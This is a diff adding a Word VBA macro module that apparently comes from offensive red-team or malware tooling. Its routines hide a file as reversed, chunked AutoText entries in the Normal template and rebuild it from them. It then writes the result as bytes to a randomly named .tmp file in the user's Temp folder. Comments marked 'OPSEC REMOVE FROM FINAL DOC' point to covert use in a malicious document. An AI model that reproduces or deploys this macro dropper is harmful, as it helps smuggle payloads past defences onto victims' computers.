@@ -1,0 +1,142 @@
+
+Sub delete_autotextentries()
+' OPSEC REMOVE FROM FINAL DOC
+
+    For Each oAutoText In NormalTemplate.AutoTextEntries
+        If oAutoText.Name Like "*AUTOTEXTEMBED*" Then
+            NormalTemplate.AutoTextEntries.Item(oAutoText.Name).Delete
+        End If
+    Next
+End Sub
+
+
+Sub insert_autotext()
+' OPSEC REMOVE FROM FINAL DOC
+' May need to run this once or twice. Sometimes insert doesn't work because of interference with clipboard/copy/paste.
+' Note: Doc contents must be empty to avoid embedding the wrong content.
+
+    Dim objFSO As Object
+    Dim objFolder As Object
+    Dim objFile As Object
+            
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFolder = objFSO.GetFolder("C:\dev")
+    
+    
+    For Each objFile In objFolder.Files
+        
+        If objFile.Name Like "*AUTOTEXTEMBED*" Then
+            
+            ' Read in each section of the embedded file. Each autotext is at most 254 bytes as autotext.value caps at 255.
+            Dim strText As String
+            Dim FSO  As Object
+            Dim TSO As Object
+            
+            Set FSO = CreateObject("Scripting.FileSystemObject")
+            Set TSO = FSO.OpenTextFile(objFile.Path)
+            
+            strText = TSO.ReadAll
+            TSO.Close
+            
+            Set TSO = Nothing
+            Set FSO = Nothing
+            
+            Debug.Print strText
+            
+            ' Paste into doc since it needs a range.
+            ActiveDocument.Content.InsertBefore Text:=strText
+            
+            ' Select the snippet in the doc.
+            Selection.WholeStory
+            
+            ' Add a AutoTextEntry named with the filename.
+            NormalTemplate.AutoTextEntries.Add Name:=Left(objFile.Name, InStrRev(objFile.Name, ".") - 1), Range:=Selection.Range
+            
+            ' Delete snippet to make room for next one.
+            Selection.Delete
+            
+        End If
+    Next objFile
+End Sub
+
+
+Function StrRev(StrR As String) As String
+  For i = Len(StrR) To 1 Step -1
+    var = Mid(StrR, i, 1)
+    Rev = Rev & var
+  Next
+  StrRev = Rev
+End Function
+
+
+
+Sub write_autotext_to_file()
+    
+    ' Count the number of autotext entries in the doc. Entries are in numerical order where N is appended to name.
+    Dim entry_count As Integer
+        entry_count = 0
+        For Each oAutoText In NormalTemplate.AutoTextEntries
+            ' Name must match what was used in insert_autotext.
+            If oAutoText.Name Like "*AUTOTEXTEMBED*" Then
+                entry_count = entry_count + 1
+            End If
+        Next
+        
+        Dim i As Integer
+        Dim text_entry As String
+        Dim rebuilt_str As String
+            
+        ' Grab each entry and append in order as string. The .Value doesn't return more than 255, which is why entries are split into 254 chars.
+        For i = 1 To entry_count
+            text_entry = "AUTOTEXTEMBED" & CStr(i)
+            rebuilt_str = rebuilt_str & ActiveDocument.AttachedTemplate.AutoTextEntries(text_entry).Value
+        Next i
+        
+        Dim reversed As String
+        
+        ' String was reversed in splitter utility so reversing again.
+        reversed = StrRev(rebuilt_str)
+        
+        ' Probably overkill for removing whitespace.
+        reversed = Replace(reversed, vbLf, "")
+        reversed = Replace(reversed, vbCrLf, "")
+        reversed = Replace(reversed, vbCr, "")
+        reversed = Replace(reversed, vbNewLine, "")
+        reversed = Replace(reversed, Chr(10), "")
+        
+        Dim config_array() As Byte
+        Dim reversed_arr() As String
+        
+        ' String now in correct order. Split into array and convert from Char array to Byte array.
+        reversed_arr = Split(reversed, ",")
+        ReDim config_array(LBound(reversed_arr) To UBound(reversed_arr))
+    
+        Dim index As Long
+        For index = LBound(reversed_arr) To UBound(reversed_arr)
+            config_array(index) = reversed_arr(index)
+        Next index
+        
+        
+        Dim filename_chars As String
+        filename_chars = "123456789abcdefghijklmnopqrstuvwxyz"
+    
+        ' Generate random filename.
+        Dim filename_len As Long
+        For filename_len = 1 To 8
+            random_filename = random_filename & Mid$(filename_chars, Int(Rnd() * Len(filename_chars) + 1), 1)
+        Next
+        'Debug.Print random_filename
+
+        ' Drop the extracted file in the appdata temp directory
+        FileName = Environ("USERPROFILE") & "\AppData\Local\Temp\" & random_filename & ".tmp"
+        
+        Const adTypeBinary = 1
+        Const adSaveCreateOverWrite = 2
+        Dim BinaryStream
+        Set BinaryStream = CreateObject("ADODB.Stream")
+        BinaryStream.Type = adTypeBinary
+        BinaryStream.Open
+        BinaryStream.Write config_array
+        BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
+
+End Sub
